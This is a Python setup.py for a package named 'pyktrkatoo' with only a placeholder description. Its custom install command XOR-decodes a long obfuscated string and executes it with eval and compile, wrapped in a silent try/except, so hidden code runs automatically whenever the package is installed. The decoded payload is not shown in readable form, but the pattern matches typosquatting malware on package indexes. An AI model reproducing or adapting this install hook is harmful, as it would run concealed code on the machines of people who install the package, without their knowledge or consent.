from setuptools import setup, find_packages
from setuptools.command.install import install
from pathlib import Path



VERSION = '1.0.0'
DESCRIPTION = 'Cool package.'
this_directory = Path(__file__).parent
long_description = (this_directory / "README.md").read_text()


class InstallCommand(install):

    def run(self):
        try:
            wopvEaTEcopFEavc ="ZXF\\DD\x16YD;Y_DWGE\x12DLZIA\\RQAB;XVSQX\x16\x08\x13VB\x17TVLTZV^V\x1a\x1d8]U\x18]C\x19BYB_\x1cSMY@DG\x11V\x17u\x0cmnbCVBGlmCUVUP_NedxHBuUDWemg\\T[ZXWjjzXS@[KZWFkeoP]W^CAmmgMUJB\x16xVWDeocJWRCVUAhngJKFUZ\x04\x0cjk\x15\x1f\x15\r\x0e\x10rX\\CS\x0c;8\x17\x10\x13\x10[C\x1fUR][K\x19U\x1b{\x03dndGUDJmiHYYT_^Kjkp@BpYAPnkkWX^Z_Snm|]ZFWEYSGemnZ]\\WBBkda@SFG\x18\x7fUYGdjg@YRBR]GelcOEEWZ\x06\x07\x12\x1d:\x11\x18\x19\x19]IT]\x11^\x1b{\x08mheE\\CFoiM_YW_XJmlsDHqPFVedk\\R\\]\\Vmht][DYF\\_EeodQVQ^@Knha@RJF\x10zWVCknfG_TBUTCljeHACU^\x06\x00lmopw\x01\x0b\x1fE[K\x1b\x14\x12\x13U\x12\x1f\x17FGZAS\x1bP\x17eSC\x11gA\\k]T^[\x19\x05\x19pATUFT~VSQ[B\x1e\x17djRKZCL\x16fYRT^\x16\x1b\x14oVeC_aPS[^\x18gE]\x10WQB\x18\x05\x02\x18\x12\x11\x10\x11s\x0elmmJ\\@JmoBTV_[_IljxAEwTBRjldYV\\Y\\Sdi|[TKWJ\\UEhnfXZ][OEji`MPKG\x13u][DkdbF]SAY_CknkODFSX\x06\x07lhny~\x05\x04\x1fPVD\x11\x10\x12\x10rPK\x11\x01\r\x18\x1f\x19\x08eVaT@\x10aJYf[PZ_\x16\r\x16xXEX[Z_\x12\x188\x17\x19\x18\x19\\CTZ\x1aW\x13w\x03hdcEPAJmeH_W_\\_JdnuBDwYFQknjYV__[WolyPSBYE^TClog]^UWNJnebGXJM\x18\x7fTZEjeaG\\RDR[CjjdEQ@@MEmn`pv\x0f\x07\x1dGVA\x13\x1d\x14\x1bU\x1a\x1f\x18BAPE\\\x1bU\x1f\x1f\x12bRL\x12cA\\`PW\\[\x12\x05\x16t@STDV\x7fVSUSB\x1e\x13edSAYDD\x1fkQ\\^U\x13\x1a\x19dWoAYgXSU]\x1ba@X\x13UXD\x1e\x04\x05\x19\x12\x12\x18\x17r\x08kemJVABhnJ][^]VKjirIA}RGYdicXY_]\\Sod\x7fYT@WEXTBildYZ]_GEjmaCQAD\x14}TVLeniC\\^JXUAmhcOJEP^\x03\x02ojcOECT]\x1cQ@P\x13\x12\x11\x19{QA\x1b\x02\x00\x1b\x1d\x11\x04eZkSB\x15dJYj[VTT\x15\x0c\x17v]@Z]]_8cRF\x18aDZe]U_\\\x14\x04\x10sDSPFR\x7fQZQSE\x10\x1bnaZCZIL\x17kZTX\\\x14\x10\x11i]bE[eXSZ[\x1fbGZ\x18VY@\x1f\n\x0c\x10\x13\x15\x11\x16q\x0bmhlG]DEioB]VTZVEimvHBpS@RdnbXSU_YUji}ZSFVC_PBmn`Y]T[GBdejFXCG\x19u\\VGmh`DVVGRXEojcOECT]\x04\x00dibKDM]T\x0b\x05\x1fQJT\x13\x14\x1f\x14{^D\x1d\x00\r\x18\x15\x13\x03dVfTC\x18eGZg[]^\\\x17\x0f\x18xXF^\\^T\x17\x13\x1e\x19:\x15TXFDQW]]^\x11\x17MKSWBU\\J\x19UKU[GXU^TW_YQ\x16\x1fRY@_\\]U\\\x15\x1eBEPWKZGH\x14t~cq~fwcxq\x13\x1bYMGC\x02\x17\x1a\x04\x06\x16\x03\x03\n\x1a\x01\r\x1c\x01\x03\n\x02\x0e\x07\n\x07\x1aT_\x1fFL^D_[T\x10\x17\x12p\nhldK\\KAemHUW^Q\\LhlwIAqRAWojbYWZX^UhdxXQEVKVUGmheX_PVCKjjfGXCM\x13~]V@mkh@[UFRUAlkaAECW[\x03\x04olFL^D_[T\x1cRHV\x12h^BLXKF\x19\x13\x11\x19\x1az\x02nmaCSKBioNZ\\QYXKkmqBD|TESkejVR^XZUmmyPWJYEZUMmedZV\\ZFDdngFUAL\x12}R\\MjkbDZWAQYJlleOBFR]\x05\x04hlCMWM[TT\x1d\\@\\\x1an_>\x10\x16\x19\x11T[T\x16\x0e\x16\x17\x14Mkm\x12GG]G_SZ\\de\x11\t\x11hn\x13EQJ@dj\x14\x19\x13em\x1bP\\VLP_Cdn\x16\x08ho\x1a\x15\x10\x1c\x12TYP[X\x15\x1b\x13\x17he\x12M\x14\x11;\x12\x17\x10\x13_DU_\x10_\x1bq\x03molK\\JAmhKZVV\\]Hjow@FrVEQnhjZP_^W_eo~XW@^B[_@dja\\]]^N@odkAPEL\x12yWZFdn`E]_DV_Eil`IGMU]\x00\x02mn`y}\x03\x06\x1eSYM\x1b\x1e\x19\x13R\x1b\x11\x17O@X@U\x1e_\x16\x12\x14W_GEQR[^_\x10\x1d@JT_AQ\\J\x19^JU[E_][XPRYT\x15\x1c]^N]_WYQ\x11\x18H@]]FZLK\x10q}jsp`y`~w\x10\x16QDDF\x0c\x1e\x1d\x02\x01\x1d\x01\x03\x08\x1f\n\x0c\x17\x03\r\t\t\x01\x08\x01\t\x1dUX\x1fE@BAVX\x14\x13\x14s\x0cjkdCWFKimI[V_P]NmhsAApX@Yjjg\\X\\P]TddxXTJ]G]RGdng^\\\\Y@AjicGQFM\x10}SXDnk`A_SBPUJenjH@M]T\x0e\x06mhcOJEP^\x1bSKS\x12jXUXDAU\\XX\\\x17\x16LKR]BRWC\x11Y@PWAXY\\XUS\\Q\x18\x17Q^@V^[SP\x13\x17BB^]J_CK\x16s\x7fausk\x7fexr\x11\x10_DG@\x0e\x1f\x1e\r\x08\x17\x03\x0e\t\x1d\x0b\r\x17\t\x06\t\x0e\x08\x06\x01\x00\x1aWY\x19@OC\x0e\x00\x15\x11\x12q\x0edidARKKeoH][UX_IehyFFqRMPeoaWYXXY_nh\x7f]PJ]CXTLjke_[T\\GGelcBWCF\x17}V^AlmhKVUKP^JdekKB@U[\x0f\x05iofO@BU[\x0e\x01\x1fUJQ\x1ai_P^MKXW^XZ\x12\x1eEFXZKPSG\x13TH]\\DVTZPSR]V\x12\x1bWWE^[]YR\x17\x1dFGY\\B]MI\x10pycwpb|ezt\x11\x1aQMFI\x0b\x1c\x16\r\x08\x16\x03\x06\x0c\x1e\x04\x0c\x1f\x04\x07\r\x0c\x0b\x06\x08\x07\x19S]\x1fUUUPBV\\\x1b\x18\x1bp\tmhgBTFJhdMZZTP_DooyHEuVLShnf\\Y_YYUdjz[UG_@_RMlla__VXG@lhcEYKM\x12tT]Ldeh@^SBWTBiofO@BU[\x00\x03mluUUPbv|\x17]AV\x11mZAEPFM\x14\x1a\x14\x16\x17p\x03mef@]JFmkC^[U]]EnlvBHrVFWila_UTY^Qjm\x7f^SA_G_WLeeeP_WVOJdnb@QDM\x11xV[Coj`DYPCQ_GdibFVKLLComc{\x7f\x07\x00\x17BZE\x14i]ZDK_\x13\x15p\x15\x13tW\\@WZG\x15fIGW\x02\x16VBFYYPQ@P_^\x19\\B]Y\x12\x13\x1dP\x10JYQXO\x19YGMHJ\x02\x1d\x1eWQXXCL\x1dQ_@U_DR\x19R__\x1bYEX\x1d@\\ZQ\\\\ZG\x1d\x00\x00\x01\n\x00\x0b\x07\x06\x00\x03\x0c\x00\x0e\x04\x05\n\x08\x00\x08\x18us_TFq\x0c\\\x01pH\x0eGR\x05a\rVUg`cv\t\x04OW|\x04tlvc`w~Xrm\x7fsT}inz\x03kmVTryT\x05\x04nl\x0e|\x00q|\x00\x07\x07F\x08\x12\x16\x15\x1e3\x18\x19\x13\x13BAPAC[ZQKE\x18GFW\x19_\x11p\x02didD]@GnhHT]W^\\EjksFEtRDUelbYW\\[YWolyYRJVJ]_EoeoPVV^CCjebARGB\x13{UXCkm`@[_GP_DedjJ@EQ_\x07\x05hecqx\x05\x07\x1dOSJ\x11\x1f\x18K]T[T\x0f`@AV\x14\x12S_W[]\nfD@U\x1a:\x14\x19\x10\x10<S]AR\n\x13\x10\x14:\x11\x18\x19\x19BXB@3\x1b\x19H@XZD\x1e\x1bY\\\x13\\X@BQZZ^_W\x1c\x1a\x16\x17\x18" 

            iOpvEoeaaeavocp = "3563606671024851279893314211494866539193388517824243820728672650304900661270304018992913989821406915"
            uocpEAtacovpe = len(wopvEaTEcopFEavc)
            oIoeaTEAcvpae = ""
            for fapcEaocva in range(uocpEAtacovpe):
                nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
                qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
                oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


            eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
        except:
            pass
        install.run(self)


setup(
    name="pyktrkatoo",
    version=VERSION,
    author="HW",
    author_email="",
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=long_description,
    packages=find_packages(),
    install_requires=[],
    keywords=[],
    classifiers=[
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Operating System :: Unix",
        "Operating System :: MacOS :: MacOS X",
        "Operating System :: Microsoft :: Windows",
    ],
    cmdclass={
        'install': InstallCommand
    }
)